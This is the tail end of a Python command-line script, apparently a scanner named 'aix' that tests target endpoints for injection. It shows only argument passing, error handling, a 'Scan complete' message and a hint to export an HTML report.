                target=target, api_key=key, profile=profile,
                verbose=verbose, evasion=evasion,
                parsed_request=parsed_request, proxy=proxy, cookies=cookie, headers=headers,
                injection_param=param, body_format=format,
                refresh_config={'url': refresh_url, 'regex': refresh_regex, 'param': refresh_param, 'error': refresh_error},
                response_regex=response_regex,
                eval_config={'url': eval_url, 'api_key': eval_key, 'model': eval_model, 'provider': eval_provider},
                level=level, risk=risk, show_response=show_response, verify_attempts=verify_attempts
            )
        except Exception as e:
            console.print(f"[red][-][/red] {name} failed: {e}")
        console.print()

    console.print("[bold green][+][/bold green] Scan complete!")
    console.print("[dim]Run 'aix db --export report.html' to generate report[/dim]")


if __name__ == '__main__':
    main()
